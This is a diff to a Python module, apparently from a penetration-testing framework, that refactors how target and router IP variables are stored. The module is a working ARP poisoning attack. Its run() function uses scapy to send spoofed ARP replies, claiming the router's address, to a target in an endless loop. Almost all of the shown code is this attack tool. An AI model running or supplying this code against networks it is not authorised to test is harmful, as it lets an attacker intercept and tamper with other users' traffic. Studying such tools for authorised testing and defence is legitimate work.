@@ -1,9 +1,9 @@
 #		Copyright (C) 2015 Noa-Emil Nissinen (4shadoww)
 from core import colors
-from collections import OrderedDict
 import subprocess
 from scapy.all import *
 from time import sleep
+from collections import OrderedDict
 
 
 conf = {
@@ -20,15 +20,10 @@ conf = {
 
 # List of the variables
 variables = OrderedDict((
-	('target', '192.168.1.3'),
-	('router', '192.168.1.1'),
+	('target', ['192.168.1.3', 'target ip address']),
+	('router', ['192.168.1.1', 'router ip address'])
 ))
 
-# Description for variables
-vdesc = [
-	'target ip address',
-	'router ip address',
-]
 
 # Additional help notes
 help_notes = colors.red+"this module will not work without root permission!"+colors.end
@@ -42,8 +37,8 @@ def run():
 	sleep(1)
 	print(colors.blue + "[*]ARP Poisoning Has Been Started ..." + colors.end)
 	packet = ARP()
-	packet.psrc = variables['router']
-	packet.pdst = variables['target']
+	packet.psrc = variables['router'][0]
+	packet.pdst = variables['target'][0]
 	while 1:
 		send(packet, verbose=False)
 		sleep(1)
